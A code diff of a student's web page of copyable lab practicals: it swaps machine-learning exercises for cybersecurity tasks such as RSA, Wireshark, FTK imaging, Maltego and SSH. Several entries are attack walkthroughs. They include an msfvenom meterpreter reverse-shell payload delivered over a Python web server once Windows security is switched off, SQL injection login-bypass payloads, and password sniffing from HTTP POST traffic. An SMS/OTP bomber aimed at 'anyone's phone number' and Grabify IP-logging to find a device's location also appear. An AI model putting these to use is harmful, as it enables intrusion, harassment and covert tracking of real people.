@@ -12,7 +12,7 @@
 
         body {
             background-color: black;
-            /* Light gray background */
+            /* black background */
             font-family: Arial, sans-serif;
             text-align: center;
         }
@@ -37,510 +37,419 @@
 
 <body>
 
-    <button onclick="copyText(text1)">1A Linear Regression</button>
-    <button onclick=" copyText(text2)">1B Logistic Regression</button>
-    <button onclick="copyText(text3)">2A R CODE</button>
-    <button onclick="copyText(text4)">2B K-Nearest Neighbor</button>
-    <button onclick="copyText(text5)">3 Naive Bayes</button>
-    <button onclick="copyText(text6)">4 K-Means Clustering</button>
-    <button onclick="copyText(text7)">5 Data Visualization Python</button>
-    <button onclick="copyText(text8)">6 Bar Pie Charts</button>
-    <button onclick="copyText(text9)">7 ETL Process</button>
-    <button onclick="copyText(text10)">8 Data Visualization Matplotlib, Seaborn, Plotly</button>
-    <button onclick="copyText(text11)">9 Decision Tree</button>
+    <button onclick="copyText(text1)">1 RSA</button>
+    <button onclick=" copyText(text2)">2 IP Configuration</button>
+    <button onclick="copyText(text3)">3 Browser History Examiner</button>
+    <button onclick="copyText(text4)">4 Grabify</button>
+    <button onclick="copyText(text5)">5 SMS/ Phone Bomber</button>
+    <button onclick="copyText(text6)">6 UI Path</button>
+    <button onclick="copyText(text7)">7 Wireshark</button>
+    <button onclick="copyText(text8)">8 FTK Manager</button>
+    <button onclick="copyText(text9)">9 NCAT</button>
+    <button onclick="copyText(text10)">10 SQL Injection</button>
+    <button onclick="copyText(text11)">11 Maltego</button>
+    <button onclick="copyText(text12)">12 Putty SSH</button>
     
     
     <p id="copiedMsg"></p>
     <script>
-        var text1 = `# 1A Linear Regression
+        var text1 = `# 1 - RSA
 
-# Libraries Required
-import random
-from sklearn.linear_model import LinearRegression
+from Crypto.PublicKey import RSA
+from Crypto import Random
+from Crypto.Cipher import PKCS1_v1_5
+import binascii
 
-print("Name : Shipra Jana")
-print("Roll : KFMSCIT014")
+random = Random.new().read
+key = RSA.generate(1024, random)
+message = b'Heyy its Shipra Jana'
+# ENCRYPTION
+cipher_encrypt = PKCS1_v1_5.new(key)
+encrypted_message = cipher_encrypt.encrypt(message)
+print("ORIGINAL MESSAGE IS:", message)
+print("ENCRYPTED MESSAGE IS: ", binascii.hexlify(encrypted_message))
+# DECRYPTION
+# converted_message=text
+cipher_decrypt = PKCS1_v1_5.new(key)
+decrypted_message = cipher_decrypt.decrypt(encrypted_message, None)
+print("DECRYPTED MESSAGE IS: ", decrypted_message)
 
-# Declarartion Code
-feature_set = []
-target_set = []
-rows = 200
-limit = 2000
-
-# To ready Training Data
-for i in range(0,rows):
- x = random.randint(0,limit)
- y = random.randint(0,limit)
- z = random.randint(0,limit)
- g = 10*x + 2*y + 3*z
-
- print("x=",x,"\ty=",y,"\tz=",z,"\tg=",g);
- print("=========================================")
- feature_set.append([x,y,z])
- target_set.append(g)
-
-# Train The Model
-model = LinearRegression()
-model.fit(feature_set,target_set)
-print("Training is completed")
-
-Test_Data = [[1,2,1]]
-prediction = model.predict(Test_Data)
-print('Prediction:'+str(prediction)+'\t'+ 'Coefficient:'+str(model.coef_))
-print("Name : Shipra Jana 014")
+''' pip uninstall crypto
+pip uninstall pycryptodome
+pip install pycryptodome'''
 
     `;
     
-        var text2 = `# 1B Logistic Regression
+        var text2 = `# 2 IP Configuration
 
-# Libraries Required
-import pandas as pd
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.linear_model import LogisticRegression
-from sklearn.metrics import confusion_matrix, accuracy_score
+ipconfig/displaydns
+ipconfig/all
+ipconfig/flushdns
+wmic os get osarchitecture
 
-print("Name : Shipra Jana")
-print("Roll : KFMSCIT014")
 
-dataset = pd.read_csv("diabetes.csv")
-print(dataset.head())
 
-x = dataset.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7]].values
-y = dataset.iloc[:, [-1]].values
 
-x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.2, random_state=100)
 
-sc = StandardScaler()
-x_train = sc.fit_transform(x_train)
-x_test = sc.transform(x_test)
+ipconfig/displaydns
+The command "ipconfig /displaydns" is used in Windows systems to show the contents of the
+Domain Name System (DNS) resolver cache. This cache stores information about recently resolved
+DNS queries, including the corresponding IP addresses.
 
-model = LogisticRegression()
 
-model.fit(x_train, y_train)
 
-y_pred = model.predict(x_test)
+ipconfig/all
+The command "ipconfig /all" is used in Windows systems to display detailed information about
+network interfaces, including their configurations and current network settings.
 
-cm = confusion_matrix(y_test, y_pred)
-print("Confusion Matrix :\n ", cm)
-print("Accuracy :", accuracy_score(y_test, y_pred) * 100)
-print("Name : Shipra Jana 014")
 
-`;
 
-        var text3 = ` # 2A R 
+ipconfig/flushdns
+The command "ipconfig /flushdns" is used in Windows systems to clear the DNS resolver cache.
+This cache stores information about previously resolved DNS queries, and flushing it can be helpful
+in troubleshooting DNS-related issues or when you want to force your computer to re-query DNS
+servers for domain name resolution.
 
-       # Print Name
-print("Shipra")
-print("KFMSCIT014")
-print("Practical-2")
 
-# Single-variable:
-  Name <- "Shipra Jana"
-Class <- "MSC.IT"
-Name
-Class
 
-# Multiple-variables:
-# Assign the same value to multiple variables in one line
-  var1 <- var2 <- var3 <- "Strawberry"
-var1
-var2
-var3
+wmic os get osarchitecture
+The command "wmic os get osarchitecture" is used in Windows systems to retrieve information
+about the operating system architecture. When you run this command in the Command Prompt, it
+will return the architecture of the operating system, either 32-bit or 64-bit.
 
-# Plot Single-Point:
-  plot(2,5)
-title(main = "Single-Point")
-
-# Plot Multiple-Points:
-  plot(c(1,8), c(3,10))
-title(main = "Multiple-Points")
-
-# R Line:
-#plot() function and add the type parameter with a value of "l":
-  plot(1:10, type="l")
-  title(main = "R-Line")
-  
-# Line Color:
-  plot(1:10, type="l", col="blue")
-  title(main = "Line Color")
-  
-# Line Width:
-    plot(1:10, type="l", col="violet", lwd=6)
-  title(main = "Line Width")
-  
-# Multiple Lines:
-    line1 <- c(1,2,3,4,5,10)
-  line2 <- c(2,5,7,8,9,10)
-  plot(line1, type = "l", col = "blue", lwd=4)
-  lines(line2, type="l", col = "red", lwd=2)
-  title(main = "Multiple-Lines")
-  
-# Scatter Plots:
-    x <- c(5,7,8,7,2,2,9,4,11,12,9,6)
-  y <- c(99,86,87,88,111,103,87,94,78,77,85,86)
-  plot(x, y, col="red", lwd=2)
-  title(main = "Scatter Plots")
-  
-# Example above should show the result of 12 cars passing by.
-  # let's add a header and different labels to describe the scatter plot better.
-    x <- c(5,7,8,7,2,2,9,4,11,12,9,6)
-  y <- c(99,86,87,88,111,103,87,94,78,77,85,86)
-  plot(x, y, col="violet", lwd=2, main="Shipra", xlab="Car age", ylab="Car speed")
-  
-  
-# Bar Charts:
-    # x-axis values
-    x <- c("A", "B", "C", "D")
-  # y-axis values
-  y <- c(2, 4, 6, 8)
-  barplot(y, col="violet", names.arg = x)
-  title(main = "Bar Charts")
-  
 
 `;
 
-        var text4 = ` # 2B K-Nearest Neighbor
+        var text3 = ` # 3 Browser History Examiner
+        
+Step 1 – Download the BHE Browser History Examiner tool.
+https://www.foxtonforensics.com/browser-history-examiner/
 
-# Libraries Required
-import matplotlib.pyplot as plt
-from sklearn.neighbors import KNeighborsClassifier
+Step 2 – Open “Browser History Examiner” and click on “Continue Trial.
 
-# Data Set
-x = [4, 5, 10, 4, 3, 11, 14 , 8, 10, 12]
-y = [21, 19, 24, 17, 16, 25, 24, 22, 21, 21]
-classes = [0, 0, 1, 0, 0, 1, 1, 0, 1, 1]
+Step 3 – Click on “Capture History”
 
-# To plot data set
-plt.scatter(x, y, c=classes)
-plt.title("Shipra Jana 014")
-plt.show()
+Step 4 – Click on “Capture history from this computer” then Next it will discover user profiles.
 
-# To merge x and y into single list
-data = list(zip(x, y))
-print(data)
+Step 5 – It will display the User Profile “shipra” and check the Browser and Data and select Destination folder and
+Capture.
 
-# model creation
-model = KNeighborsClassifier(n_neighbors=1)
+Step 7 – It will display all the Data.
+Logins
+Cache images
+Email Address
+Website Visits
 
-# Model is trained
-model.fit(data, classes)
-new_x = 8
-new_y = 21
+`;
 
-new_point = [(new_x, new_y)]
-prediction = model.predict(new_point)
+        var text4 = ` # 4 Grabify
+        
+Using Grabify - https://grabify.link/
+Step 1 – Go to GRABIFY site using the above link and enter the “w3schools” link to create a new URL.
 
-plt.title("Shipra Jana 014")
-plt.scatter(x + [new_x], y + [new_y], c=classes + [prediction[0]])
-plt.text(x=new_x-1.7, y=new_y-0.7, s=f"new point, class: {prediction[0]}")
-plt.show()
+Step 2 – The new URL created
 
-model = KNeighborsClassifier(n_neighbors=5)
-model.fit(data, classes)
+Step 3 – It will show the Advanced Log.
+(all the information about the device)
 
-prediction = model.predict(new_point)
-print(prediction)
-
-plt.title("Shipra Jana 014")
-plt.scatter(x + [new_x], y + [new_y], c=classes + [prediction[0]])
-plt.text(x=new_x-1.7, y=new_y-0.7, s=f"new point, class: {prediction[0]}")
-plt.show()
+Step 4 – Using Ip latitude & longitude we can check the device current location.
+IP LATITUDE 19.0760 (19° 4′ 33.51″ N)
+IP LONGITUDE 72.8774 (72° 52′ 38.57″ E
  
 `;
 
-        var text5 = `# 3 Naive bayes
+        var text5 = ` # 5 SMS/ Phone Bomber
 
-# !pip install pgmpy
-# libraries required4
-import pandas as pd
-from pgmpy.estimators import MaximumLikelihoodEstimator
-from pgmpy.models import BayesianNetwork
-from pgmpy.inference import VariableElimination
 
-# import data
-data = pd.read_csv('heartdisease.csv')
-heart_disease = pd.DataFrame(data)
-print(heart_disease)
+Step 1 – Go to the below link to Protect your Number Permanently from OTP Bombarding.
+https://greatonlinetools.com/smsbomber/protect/
 
-model = BayesianNetwork([
- ('Age', 'Lifestyle'),
- ('Gender', 'Lifestyle'),
- ('Family', 'HeartDisease'),
- ('Diet', 'Cholestrol'),
- ('Lifestyle', 'Diet'),
- ('Cholestrol', 'HeartDisease'),
- ('Diet', 'Cholestrol')
-])
+Step 2 – Using the same link, we can be bombarded with OTP to anyone’s phone number.
 
-model.fit(heart_disease, estimator=MaximumLikelihoodEstimator)
-HeartDisease_infer = VariableElimination(model)
-print('For Age enter SuperSeniorCitizen:0, SeniorCitizen:1, MiddleAged:2, Youth:3, Teen:4')
-print('For Gender enter Male:0, Female:1')
-print('For Family History enter Yes:1, No:0')
-print('For Diet enter High:0, Medium:1')
-print('for LifeStyle enter Athlete:0, Active:1, Moderate:2, Sedentary:3')
-print('for Cholesterol enter High:0, BorderLine:1, Normal:2')
-q = HeartDisease_infer.query(variables=['HeartDisease'],
- evidence={
- 'Age': int(input('Enter Age: ')),
- 'Gender': int(input('Enter Gender: ')),
- 'Family': int(input('Enter Family History: ')),
- 'Diet': int(input('Enter Diet: ')),
- 'Lifestyle': int(input('Enter Lifestyle: ')),
- 'Cholestrol': int(input('Enter Cholestrol: '))
-})
-print(q)
-print("Shipra Jana 014")
-        
+Step 3 – SMS BOMB SUCCESSFUL.
+(After entering the phone number and click on start it will be bombarded with OTP to the entered
+ phone number.)
+
+
   `;
   
-        var text6 = ` # 4 K-Means Clustering
+        var text6 = ` # 6 UI Path
 
-# Libraries Required
-import matplotlib.pyplot as plt
-from sklearn.cluster import KMeans
+Step 1 – Open you’re “GMAIL” go to “Security” click on 2-step Verification.
 
-# Data Set
-x = [4, 5, 10, 4, 3, 11, 14 , 6, 10, 12]
-y = [21, 19, 24, 17, 16, 25, 24, 22, 21, 21]
+Step 2 – In 2-Step Verification click on “App passwords”.
 
-# Plotting the data points
-plt.scatter(x, y)
-plt.title("Shipra Jana 014 \n Plotting Data Points")
-plt.show()
+Step 3 – Go to App Passwords and add a “APP name” as “LOGIN” as your choice and create.
 
-# Combining the x and y coordinates into a list of tuples
-data = list(zip(x, y))
+Step 4 – After creating an App name, it will automatically “Generated app password”.
 
-# Initializing and fitting the KMeans model with 2 clusters
-kmeans = KMeans(n_clusters=2)
-kmeans.fit(data)
+Step 5 – Use this link to “Sign up” in “Ui path” https://www.uipath.com/product/automation-cloud/
+and “choose an account” to continue.
 
-# Plotting the clustered data points
-plt.scatter(x, y, c=kmeans.labels_)
-plt.title("Shipra Jana 014 \n Plotting Clustered Data Points")
-plt.show()
+Step 7 – Now “Sign in” to your account.
 
-`;
+Step 8 – Click on “Download Studio” it will start downloading then start to “install”.
 
-        var text7 = `#5 Data Visualization using Python
+Uipath Setup
+Step 9 – Choose (“Quick (recommended for Community Users”) accept terms and click on Install after
+installation is completed “Launch Uipath Studio”.
 
-# Libraries Required
-import pandas as pd
-import matplotlib.pyplot as plt
+Step 10 – Sign in with the account to “Connect to tenant”.
 
-# reading the database
-data = pd.read_csv("tips.csv")
+Step 11 – Choose “UiPath Studio”.
 
-# printing name
-print(" Shipra Jana")
+Step 12 – Go to New Project and click on “Process”.
 
-# printing the top 10 rows
-print(data.head(10))
+Step 13 – Start with a New Blank Process add the Name specify Location and Create.
 
-# Scatter plot with day against tip
-plt.scatter(data['day'], data['tip'])
+Step 14 – This is the interface we will get.
 
-# Adding Title to the Plot
-plt.title("Shipra Jana 014 - Scatter Plot")
-# Setting the X and Y labels
-plt.xlabel('Day')
-plt.ylabel('Tip')
-plt.show()
+Step 15 – Click on “+” and search “Input Dialog” and drop it.
 
+Step 16 – Add the Data to Dialog Title as “DATA”, Input label as “ENTER THE EMAIL_ID OF RECEIVER”
+and Value entered as email.
 
+Step 17 - Click on “+” and search “SMTP” and drop it.
+Enter same Email and generated app password.
+Enter Port 587 and server “smtp.gmail.com”
+Enter value to subject and body to the receiver mail.
 
-# libraries required
-import pandas as pd
-import matplotlib.pyplot as plt
-# reading the database
-data = pd.read_csv("tips.csv")
-# printing name
-print(" Shipra Jana")
-# printing the top 10 rows
-print(data.head(10))
-# Scatter plot with day against tip
-plt.scatter(data['day'], data['tip'], c=data['size'],s=data['total_bill'])
-# Adding Title to the Plot
-plt.title("Shipra Jana 014 - Scatter Plot")
-# Setting the X and Y labels
-plt.xlabel('Day')
-plt.ylabel('Tip')
-plt.colorbar()
-plt.show()
+Step 18 - Click on “+” and search “Message Box” and drop it.
 
+Step 19 – Now Run.
+
+Step 20 – Pop up will appear to enter the email_id of receiver and click on Ok.
+email sent!
+
+Step 21 – Now check to the receiver email id to see the message.
 
 `;
 
-var text8 = `# 6 Pie Bar Chart Diagram using Python
+var text7 = ` # 7 Wireshark
 
+Step 1 - Open Wireshark and either you can load the pre-captured files (pcap/pcapng) or start a live
+capture through the network.
 
-# BAR CHART
-# libraries required
-import pandas as pd
-import numpy as np
-import matplotlib.pyplot as plt
-# reading the database
-data = pd.read_csv("tips.csv")
-# Bar chart with day against tip
-plt.bar(data['day'], data['tip'], color="violet")
-plt.title("Shipra Jana 014 - Bar Chart")
-# Setting the X and Y labels
-plt.xlabel('Day')
-plt.ylabel('Tip')
-# Adding the legends
-plt.show()
+Step 2 - Start the Wireshark in background and go to an unsecure website so we can fetch the credentials.
+Sample Website: http://testphp.vulnweb.com/login.php
 
+Step 3 - Now, stop capturing the data packets and go to search filter and type http, here all http protocol
+related packets will be displayed.
 
-# Pie Chart-1 [Normal Pie Chart]
-import numpy as np
-import matplotlib.pyplot as plt
-plt.title("Shipra Jana 014 - Normal PieChart")
-y1 = np.array([35,25,25,15])
-plt.pie(y1)
-plt.show()
+Step 4 - To get the exact packet, type http.request.method=="POST" in the display filter and select the
+packet and as we can see the credentials have been revealed.
 
-
-# Pie Chart-2 [Pie Chart with Labels]
-plt.title("Shipra Jana 014 - PieChart with Labels")
-y2 = np.array([35,25,25,15])
-mylabels = ["Apples", "Bananas", "Cherries", "Dates"]
-plt.pie(y2, labels=mylabels)
-plt.show()
-
-
-# Pie Chart-3 [Pie Chart with Labels and Colors]
-plt.title("Shipra Jana 014 -- PieChart with Labels and Colors")
-y3 = np.array([35,25,25,15])
-mylabels = ["Apples", "Bananas", "Cherries", "Dates"]
-mycolors = ["black","hotpink","b","#4CAF50"]
-plt.pie(y3, labels=mylabels, colors=mycolors)
-plt.show()
+Step 5 – To see the captured Username & Passwords go to the HTML Form URL Encoded and click
+you can see the Username as “Shipra1911” and Password as “ship@19”.
 
 `;
 
-var text9 = `# 7 ETL Process in Python for Web Scrapping
+var text7 = `# 8 FTK Manager
 
-import requests
-from bs4 import BeautifulSoup
+Step 1 – Click on File then choose “Create Disk Image…” enter.
 
-# create a function
-def check_word_in_webpage(url, word):
-    response = requests.get(url)
-    if response.status_code == 200:
-        # transform the content
-        soup = BeautifulSoup(response.content, 'html.parser')
-        # convert the content
-        text_content = soup.get_text()
-        # assertion
-        if word.lower() in text_content.lower():
-            print(f"The word '{word}' is present in the webpage.")
-        else:
-            print(f"The word '{word}' is not present in the webpage.")
-    else:
-        print("Failed to retrieve webpage.")
+Step 2 – Select “Physical Drive” as the Source Evidence Type.
 
-print("KFMSCIT014 Shipra Jana")
+Step 3 – Choose PHYSICALDRIVE1 “USB Device” enter Finish.
 
-url = input("Enter the url you want to Scrap : ")
-word_to_check = input("Enter the text you want to know which is present or not : ")
-check_word_in_webpage(url, word_to_check)
+Step 4 – Go to “USB Drive (E:)” Img Folder there are some images saved.
+
+Step 5 – Next, we have to “Permanently delete these images” and now the folder is empty.
+
+Step 6 – Add and “Select Image Type” as “Raw (dd) enter Next >.
+
+Step 7 – Add the “Evidence Item Information” and select “Destination Folder” for the Image.
+
+Step 8 – Select “Image Destination Folder”, add “Image File Name” and make Image size to “0”.
+
+Step 9 – Click on “Start” and it will start “Creating Image”.
+
+Step 10 – “Image Created Successfully” and it will start “Verifying”.
+
+Step 11 – Click on “Image Summary” and after verified Image Results will display.
+
+Step 12 – Go to File and “Add Evidence Item”.
+
+Step 13 – Select Source Evidence Type as “Image File” and “Browse” the source path selects and
+Finish.
+
+Step 14 – Click on “FTKRaw.001” and select “Img” folder and we can find the retrieved images.
+
+Step 15 – We can check the “USB Drive” its empty the images are deleted and not rederived here.
+
+Step 16 – We can simply “Export Images” by right click on image and “Export Files”
+
+Step 17 – Select the “Destination Folder” to export the images click OK.
+
+Step 18 – Images are “Exported Successfully!”.
+
+
+`;
+
+var text9 = `# 9 NCAT
+
+Step 1 – Open “root kali” and type “ifconfig” to check the ip address.
+
+Step 2 - To check the IP Address from Windows command prompt type “ipconfig”.
+
+Step 3 – To check the “active port” type “ufw status” and port 22 is active.
+
+Step 4 - The command `nc -lvp 22` starts a netcat listener on port 22 with verbose output enabled.
+
+Step - 5 Now, start “msfconsole” and “msfvenom”.
+
+Step 6 – Type msfvenom -p windows/meterpreter/reverse_tcp host=192.168.0.103 lport=22 -f exe>
+/home/shipra/Desktop/Shipra/reverse_tcp.exe
+
+Step 7 - Now, use exploit.
+
+Step 8 - python -m http.server – The command `python -m http.server .` starts a simple HTTP server
+serving files from the current directory.
+
+Step 9 - Now, start the exploit with the multi handler and set the lhost and lport.
+
+Step 10 – Turn off the “Firewall & network protection and “Virus & threat protection”.
+
+Step 11 - Add the IP address and port number into the web browser
+(Note: Make sure your windows security is disabled).
+
+Step 12 - Now, download the reverse_tcp.exe and double click on it to start.
+
+Step 13 - We can access the files of the device to our virtual environment and can also perform any actions
+on the device such as making a directory or deleting any file or folder. 
 
 
 `;
 
 
-var text10 = `# 8 Data visualization using python libraries
+var text10 = `# 10 SQL Injection
 
-# Matplotlib
-# libraries required
-import pandas as pd
-import matplotlib. pyplot as plt
-#Uploading Dataset
-data = pd.read_csv("Nifty.csv")
-print("KFMSCIT014 Shipra Jana")
-print(data)
-print(" ")
-#Plotting of x-axis & y-axis plot
-plt. plot(data['Open'],marker = "o",markeredgecolor="white", markerfacecolor="blue")
-plt. plot(data['Close'],marker = "o",markeredgecolor="white", markerfacecolor="orange")
-plt.grid()
-plt. title("KFMSCIT014 Shipra Jana - Line Plot using Matplotlib")
-plt. xlabel('Open ')
-plt. ylabel('Close ')
-plt.legend(['Open', 'Close'])
-plt. show()
+Performing SQL injection to LOGIN (Get Access) into a website.
+Step 1: Here we are going to use a “Testing Website” to perform SQL Injection.
+https://demo.testfire.net/login.jsp
 
+Step 2: Login using random Username and Password.
+Username: admin’
+Password: password123
+Syntax error - Login Failed!
 
-# Seaborn
-# libraries required
-import pandas as pd
-import seaborn as sns
-import matplotlib.pyplot as plt
-# Load dataset
-data = pd.read_csv("Nifty.csv")
-print("KFMSCIT014 Shipra Jana")
-print(data)
-# Plotting
-plt.figure(figsize=(10, 6))
-sns.lineplot(data=data[['Open', 'Close']], markers=True, marker='o', markeredgecolor="white",
-palette=['green', 'red'])
-plt.title("KFMSCIT014 Shipra Jana - Line Plot using Seaborn")
-plt.xlabel('Index')
-plt.ylabel('Price')
-plt.grid(True)
-plt.show()
+SQL Injection Payloads
+OR payload
 
+Step 3: Now we are going to use “OR Payload” to LOGIN.
+Username: admin’ OR ‘1’=’1’
+Password: password123
 
-#Plotly
-# libraries required
-import pandas as pd
-import plotly.express as px
-# Load dataset
-data = pd.read_csv("Nifty.csv")
-print(" KFMSCIT014 Shipra Jana")
-print(data)
-print(" ")
-# Plotting
-fig = px.line(data, x=data.index, y=['Open', 'Close'], markers=True,
- title="KFMSCIT014 Shipra Jana - Line Plot using Plotly", labels={'index':
-'Index', 'value': 'Price'},
- color_discrete_sequence=['green', 'red'])
-fig.update_layout(legend_title='Price', legend=dict(x=0, y=1, traceorder='normal'),
- plot_bgcolor='rgba(0,0,0,0)')
-fig.show()
+Login Successfully!
+Because we have used OR payload to logged in to the website.
+
+Comment Payload (--)
+Step 5: Now we are going to use (Comment Payload) to LOGIN.
+Username: admin’--
+Password: 123
+Login Successfully! 
 
 
 `;
 
 
-var text11 = `# 9 Decision Tree
+var text11 = `# 11 Maltego
 
-# libraries required
-import numpy as np
-import pandas as pd # Import Pandas for data loading
-import matplotlib.pyplot as plt
-from sklearn.tree import DecisionTreeClassifier, plot_tree
-from sklearn.model_selection import train_test_split
-from sklearn.metrics import accuracy_score
-# reading the database
-data = pd.read_csv('iris.csv')
-print(data.head())
-# Assuming the target variable is in a column named 'target'
-X = data.drop('species', axis=1)
-y = data['species']
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
-model = DecisionTreeClassifier()
-model.fit(X_train, y_train)
-y_pred = model.predict(X_test)
-accuracy = accuracy_score(y_test, y_pred)
-print(f"Accuracy: {accuracy:.2f}")
-# Visualize and interpret the generated decision tree
-plt.figure(figsize=(12, 8))
-plot_tree(model, filled=True, feature_names=X.columns, class_names=y.unique().astype(str))
-plt.title("KFMSCIT014 Shipra Jana \n Decision Tree Visualization \n")
-plt.show()
+Perform Maltego
+Step 1: Open Maltego and click on “New” to Create a “New Graph”
+
+Step 2: Select “IPv4 Address” in the Entity Palate and drop on the Graph double click on IPv4 and add
+IP Address as “172.217.12.174” (Google).
+
+IP Address is changed now.
+
+Step 3: Right click on the IP Address and select “IP Owner Detail” and RUN.
+
+Step 4: All the detail about the IP Address is appeared in a BLOCK Layout mode.
+
+Step 5: Right Click on IP Address and Select “To DNS Name” and RUN.
+Available DNS Name
+
+Step 6: Select “DNS Name” and drop.
+Step 7: Right Click on DNS Name to edit the IP Address to find the IP Owner Details and RUN.
+
+Step 8: Select “DOMAIN” and drop.
+
+Step 9: Right Click on Domain and edit Domain name to “gnu.org” and select “Domain Owner Detail”.
+
+Step 10: Select “Email Addresses from Domain and RUN.
+It will show all the available “Email-ID” related to “gnu.org” Domain.
+
+
+`;
+
+
+var text12 = `# 12 Putty SSH
+
+Step 1 - Since we are Performing the Practical in our virtual machine be sure to check whether Our Network
+is “Bridged” i.e., the kali network works independently and has its own IP address. We’ll be using
+“ifconfig” Command to check the IP address.
+
+Step 2: - To check the IP Address from Windows command prompt.
+
+Step 3 - Let’s create a folder to access remotely.
+Commands: -
+ cd /home: This Command helps us to change the directory to home folder
+ “cd /{folder_name}”
+ mkdir /testfile: This command will create a folder “mkdir /{Folder_Name}”
+
+cd /home
+mkdir testfile
+cd testfile/
+
+Step 4 - Now we’ll create a text file in the folder that we’ve created. Once created we can insert any text
+in that file.
+Commands: -
+cat > xyz.txt
+Heyy Shipra!
+ "CTRL+D" to save the file.
+
+Step 5 - Now we’ll be checking the upgradable packages and upgrading necessary dependencies.
+apt update
+- this command allows us to check the available updates and set the dependence tree.
+
+Step 6 - We will install the Open SSh server in our kali to get capability to remotely access the terminal.
+We can install using “apt install openssh-server” command.
+apt install openssh-server
+
+Step 7 - Install ufw for security creating rules for network and check the status where it’ll show us the
+availability of the firewall and the rules applied.
+Commands: -
+apt install ufw            : To install ufw in kali.
+ufw status                 : show the status of the firewall by default ufw status is disabled.
+ufw enable                 : this command is to enable the firewall.
+
+Step 8 - Let’s add rule on our firewall by using “ufw allow 22/tcp”. The port (22) is used for Secure Shell
+(SSH) communication and allows remote administration access to the VM. In general, traffic is encrypted
+using password authentication.
+ufw allow 22/tcp
+
+Step 9 - Now we’ll start the server so that we can remotely access the terminal and check the status if the
+server is up and running.
+Command: -
+service ssh start             : This command starts the server on the IP address and port 22 which is rule
+which we have set above.
+service ssh status            : This will give the update and status of the server if its Running or down
+
+service ssh start 
+service ssh status
+
+Step 10 - Now we’ll start putty and provide IP address of our kali machine and the port i.e. 22, connection
+type will SSH and select telnet.
+
+Step 11: - After it is connected, we’ll be prompted to enter the kali credentials to access the terminal.
+
+Step 12: - After Logging in We can access the terminal and access the file which we have created.
+cd /home
+ls
+cd testfile/
+ls
+cat xyz.txt
 
 `;
 
